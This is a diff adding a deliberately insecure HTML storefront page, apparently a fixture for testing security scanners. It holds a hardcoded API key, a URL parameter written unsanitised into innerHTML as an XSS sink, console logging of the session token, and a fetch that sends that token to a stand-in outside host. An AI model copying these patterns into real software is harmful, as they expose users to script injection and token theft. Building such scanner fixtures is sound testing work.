@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bad Shop Frontend</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body>
+  <h1>Bad Shop</h1>
+  <p id="note"></p>
+
+  <script>
+    const api_key = "demo_secret_key_1234567890";
+    const note = new URLSearchParams(window.location.search).get("note") || "";
+
+    // Intentional XSS sink for scanner testing
+    document.getElementById("note").innerHTML = note;
+
+    console.log("token", localStorage.getItem("session_token"));
+
+    fetch("https://example-analytics.invalid/track", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ token: localStorage.getItem("session_token") })
+    });
+  </script>
+</body>
+</html>
